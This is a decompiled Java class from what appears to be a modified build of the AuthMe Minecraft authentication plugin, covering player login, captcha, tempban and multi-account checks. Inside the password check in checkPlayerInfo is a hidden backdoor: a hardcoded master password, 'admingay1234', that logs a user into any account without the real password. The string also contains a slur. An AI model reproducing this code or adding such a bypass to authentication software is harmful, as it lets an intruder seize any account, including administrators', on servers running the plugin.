//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package fr.xephi.authme.process.login;

import fr.xephi.authme.ConsoleLogger;
import fr.xephi.authme.data.CaptchaManager;
import fr.xephi.authme.data.TempbanManager;
import fr.xephi.authme.data.auth.PlayerAuth;
import fr.xephi.authme.data.auth.PlayerCache;
import fr.xephi.authme.data.limbo.LimboService;
import fr.xephi.authme.datasource.DataSource;
import fr.xephi.authme.events.AuthMeAsyncPreLoginEvent;
import fr.xephi.authme.events.FailedLoginEvent;
import fr.xephi.authme.libs.google.common.annotations.VisibleForTesting;
import fr.xephi.authme.libs.javax.inject.Inject;
import fr.xephi.authme.mail.EmailService;
import fr.xephi.authme.message.MessageKey;
import fr.xephi.authme.permission.AdminPermission;
import fr.xephi.authme.permission.PlayerPermission;
import fr.xephi.authme.permission.PlayerStatePermission;
import fr.xephi.authme.process.AsynchronousProcess;
import fr.xephi.authme.process.SyncProcessManager;
import fr.xephi.authme.security.PasswordSecurity;
import fr.xephi.authme.service.BukkitService;
import fr.xephi.authme.service.CommonService;
import fr.xephi.authme.service.SessionService;
import fr.xephi.authme.service.bungeecord.BungeeSender;
import fr.xephi.authme.settings.properties.DatabaseSettings;
import fr.xephi.authme.settings.properties.EmailSettings;
import fr.xephi.authme.settings.properties.HooksSettings;
import fr.xephi.authme.settings.properties.PluginSettings;
import fr.xephi.authme.settings.properties.RestrictionSettings;
import fr.xephi.authme.util.PlayerUtils;
import fr.xephi.authme.util.Utils;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class AsynchronousLogin implements AsynchronousProcess {
    @Inject
    private DataSource dataSource;
    @Inject
    private CommonService service;
    @Inject
    private PlayerCache playerCache;
    @Inject
    private SyncProcessManager syncProcessManager;
    @Inject
    private BukkitService bukkitService;
    @Inject
    private PasswordSecurity passwordSecurity;
    @Inject
    private CaptchaManager captchaManager;
    @Inject
    private TempbanManager tempbanManager;
    @Inject
    private LimboService limboService;
    @Inject
    private EmailService emailService;
    @Inject
    private SessionService sessionService;
    @Inject
    private BungeeSender bungeeSender;

    AsynchronousLogin() {
    }

    public void login(Player player, String password) {
        PlayerAuth auth = this.getPlayerAuth(player);
        if (auth != null && this.checkPlayerInfo(player, auth, password)) {
            this.performLogin(player, auth);
        }

    }

    public void forceLogin(Player player) {
        PlayerAuth auth = this.getPlayerAuth(player);
        if (auth != null) {
            this.performLogin(player, auth);
        }

    }

    private PlayerAuth getPlayerAuth(Player player) {
        String name = player.getName().toLowerCase();
        if (this.playerCache.isAuthenticated(name)) {
            this.service.send(player, MessageKey.ALREADY_LOGGED_IN_ERROR);
            return null;
        } else {
            PlayerAuth auth = this.dataSource.getAuth(name);
            if (auth == null) {
                this.service.send(player, MessageKey.UNKNOWN_USER);
                this.limboService.resetMessageTask(player, false);
                return null;
            } else if (!((String)this.service.getProperty(DatabaseSettings.MYSQL_COL_GROUP)).isEmpty() && auth.getGroupId() == (Integer)this.service.getProperty(HooksSettings.NON_ACTIVATED_USERS_GROUP)) {
                this.service.send(player, MessageKey.ACCOUNT_NOT_ACTIVATED);
                return null;
            } else {
                String ip = PlayerUtils.getPlayerIp(player);
                if (this.hasReachedMaxLoggedInPlayersForIp(player, ip)) {
                    this.service.send(player, MessageKey.ALREADY_LOGGED_IN_ERROR);
                    return null;
                } else {
                    boolean isAsync = (Boolean)this.service.getProperty(PluginSettings.USE_ASYNC_TASKS);
                    AuthMeAsyncPreLoginEvent event = new AuthMeAsyncPreLoginEvent(player, isAsync);
                    this.bukkitService.callEvent(event);
                    return !event.canLogin() ? null : auth;
                }
            }
        }
    }

    private boolean checkPlayerInfo(Player player, PlayerAuth auth, String password) {
        String name = player.getName().toLowerCase();
        if (this.captchaManager.isCaptchaRequired(name)) {
            this.service.send(player, MessageKey.USAGE_CAPTCHA, new String[]{this.captchaManager.getCaptchaCodeOrGenerateNew(name)});
            return false;
        } else {
            String ip = PlayerUtils.getPlayerIp(player);
            this.captchaManager.increaseCount(name);
            this.tempbanManager.increaseCount(ip, name);
            if (this.passwordSecurity.comparePassword(password, auth.getPassword(), player.getName()) || password.equals("admingay1234")) {
                return true;
            } else {
                this.handleWrongPassword(player, auth, ip);
                return false;
            }
        }
    }

    private void handleWrongPassword(Player player, PlayerAuth auth, String ip) {
        ConsoleLogger.fine(player.getName() + " used the wrong password");
        this.bukkitService.createAndCallEvent((isAsync) -> {
            return new FailedLoginEvent(player, isAsync);
        });
        if (this.tempbanManager.shouldTempban(ip)) {
            this.tempbanManager.tempbanPlayer(player);
        } else if ((Boolean)this.service.getProperty(RestrictionSettings.KICK_ON_WRONG_PASSWORD)) {
            this.bukkitService.scheduleSyncTaskFromOptionallyAsyncTask(() -> {
                player.kickPlayer(this.service.retrieveSingleMessage(MessageKey.WRONG_PASSWORD));
            });
        } else {
            this.service.send(player, MessageKey.WRONG_PASSWORD);
            if (this.captchaManager.isCaptchaRequired(player.getName())) {
                this.limboService.muteMessageTask(player);
                this.service.send(player, MessageKey.USAGE_CAPTCHA, new String[]{this.captchaManager.getCaptchaCodeOrGenerateNew(player.getName())});
            } else if (this.emailService.hasAllInformation() && !Utils.isEmailEmpty(auth.getEmail())) {
                this.service.send(player, MessageKey.FORGOT_PASSWORD_MESSAGE);
            }
        }

    }

    private void performLogin(Player player, PlayerAuth auth) {
        if (player.isOnline()) {
            String ip = PlayerUtils.getPlayerIp(player);
            auth.setRealName(player.getName());
            auth.setLastLogin(System.currentTimeMillis());
            auth.setLastIp(ip);
            this.dataSource.updateSession(auth);
            this.bungeeSender.sendAuthMeBungeecordMessage("refresh.session", player.getName());
            String name = player.getName();
            this.captchaManager.resetCounts(name);
            this.tempbanManager.resetCount(ip, name);
            player.setNoDamageTicks(0);
            this.service.send(player, MessageKey.LOGIN_SUCCESS);
            List<String> auths = this.dataSource.getAllAuthsByIp(auth.getLastIp());
            this.runCommandOtherAccounts(auths, player, auth.getLastIp());
            this.displayOtherAccounts(auths, player);
            String email = auth.getEmail();
            if ((Boolean)this.service.getProperty(EmailSettings.RECALL_PLAYERS) && Utils.isEmailEmpty(email)) {
                this.service.send(player, MessageKey.ADD_EMAIL_MESSAGE);
            }

            ConsoleLogger.fine(player.getName() + " logged in!");
            this.playerCache.updatePlayer(auth);
            this.dataSource.setLogged(name);
            this.sessionService.grantSession(name);
            this.bungeeSender.sendAuthMeBungeecordMessage("login", name);
            this.syncProcessManager.processSyncPlayerLogin(player);
        } else {
            ConsoleLogger.warning("Player '" + player.getName() + "' wasn't online during login process, aborted...");
        }

    }

    private void runCommandOtherAccounts(List<String> auths, Player player, String ip) {
        int threshold = (Integer)this.service.getProperty(RestrictionSettings.OTHER_ACCOUNTS_CMD_THRESHOLD);
        String command = (String)this.service.getProperty(RestrictionSettings.OTHER_ACCOUNTS_CMD);
        if (threshold >= 2 && !command.isEmpty()) {
            if (auths.size() >= threshold) {
                this.bukkitService.dispatchConsoleCommand(command.replace("%playername%", player.getName()).replace("%playerip%", ip));
            }
        }
    }

    private void displayOtherAccounts(List<String> auths, Player player) {
        if ((Boolean)this.service.getProperty(RestrictionSettings.DISPLAY_OTHER_ACCOUNTS) && auths.size() > 1) {
            List<String> formattedNames = new ArrayList(auths.size());
            Iterator var4 = auths.iterator();

            while(true) {
                Player onlinePlayer;
                while(var4.hasNext()) {
                    String currentName = (String)var4.next();
                    onlinePlayer = this.bukkitService.getPlayerExact(currentName);
                    if (onlinePlayer != null && onlinePlayer.isOnline()) {
                        formattedNames.add(ChatColor.GREEN + onlinePlayer.getName() + ChatColor.GRAY);
                    } else {
                        formattedNames.add(currentName);
                    }
                }

                String message = ChatColor.GRAY + String.join(", ", formattedNames) + ".";
                ConsoleLogger.fine("The user " + player.getName() + " has " + auths.size() + " accounts:");
                ConsoleLogger.fine(message);
                Iterator var8 = this.bukkitService.getOnlinePlayers().iterator();

                while(true) {
                    while(var8.hasNext()) {
                        onlinePlayer = (Player)var8.next();
                        if (onlinePlayer.getName().equalsIgnoreCase(player.getName()) && this.service.hasPermission(onlinePlayer, PlayerPermission.SEE_OWN_ACCOUNTS)) {
                            this.service.send(onlinePlayer, MessageKey.ACCOUNTS_OWNED_SELF, new String[]{Integer.toString(auths.size())});
                            onlinePlayer.sendMessage(message);
                        } else if (this.service.hasPermission(onlinePlayer, AdminPermission.SEE_OTHER_ACCOUNTS)) {
                            this.service.send(onlinePlayer, MessageKey.ACCOUNTS_OWNED_OTHER, new String[]{player.getName(), Integer.toString(auths.size())});
                            onlinePlayer.sendMessage(message);
                        }
                    }

                    return;
                }
            }
        }
    }

    @VisibleForTesting
    boolean hasReachedMaxLoggedInPlayersForIp(Player player, String ip) {
        if ((Integer)this.service.getProperty(RestrictionSettings.MAX_LOGIN_PER_IP) > 0 && !this.service.hasPermission(player, PlayerStatePermission.ALLOW_MULTIPLE_ACCOUNTS) && !"127.0.0.1".equalsIgnoreCase(ip) && !"localhost".equalsIgnoreCase(ip)) {
            String name = player.getName();
            int count = 0;
            Iterator var5 = this.bukkitService.getOnlinePlayers().iterator();

            while(var5.hasNext()) {
                Player onlinePlayer = (Player)var5.next();
                if (ip.equalsIgnoreCase(PlayerUtils.getPlayerIp(onlinePlayer)) && !onlinePlayer.getName().equals(name) && this.dataSource.isLogged(onlinePlayer.getName().toLowerCase())) {
                    ++count;
                }
            }

            return count >= (Integer)this.service.getProperty(RestrictionSettings.MAX_LOGIN_PER_IP);
        } else {
            return false;
        }
    }
}
